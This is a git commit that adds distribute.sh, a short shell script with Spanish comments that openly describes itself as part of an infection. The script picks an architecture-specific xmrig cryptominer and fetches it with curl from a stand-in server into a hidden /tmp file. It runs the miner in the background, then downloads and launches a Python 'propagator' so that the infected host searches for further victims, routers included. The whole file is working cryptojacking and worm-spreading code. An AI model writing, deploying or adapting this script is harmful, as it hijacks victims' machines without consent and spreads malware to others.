7d3c295c1faa01298be6eca7141d29b69ce0c98a
kmister656 <73868047+kmister656@users.noreply.github.com>
2026-03-22 09:24:39 +0100

    Create distribute.sh

---
+++ distribute.sh
@@ -0,0 +1,19 @@
+#!/bin/sh
+# Determinar arquitectura para no fallar la infección
+ARCH=$(uname -m)
+URL_BASE="http://tu-servidor.com/assets"
+
+if [ "$ARCH" = "x86_64" ]; then
+    MINER="xmrig_64"
+else
+    MINER="xmrig_mips" # Común en routers
+fi
+
+# Descarga silenciosa y ejecución
+curl -L $URL_BASE/$MINER -o /tmp/.sys_proc
+chmod +x /tmp/.sys_proc
+/tmp/.sys_proc -o pool -u wallet --background
+
+# Descarga el propagador (v_turbo.py) para que esta máquina también busque víctimas
+curl -L $URL_BASE/v_turbo.py -o /tmp/.v.py
+python3 /tmp/.v.py &
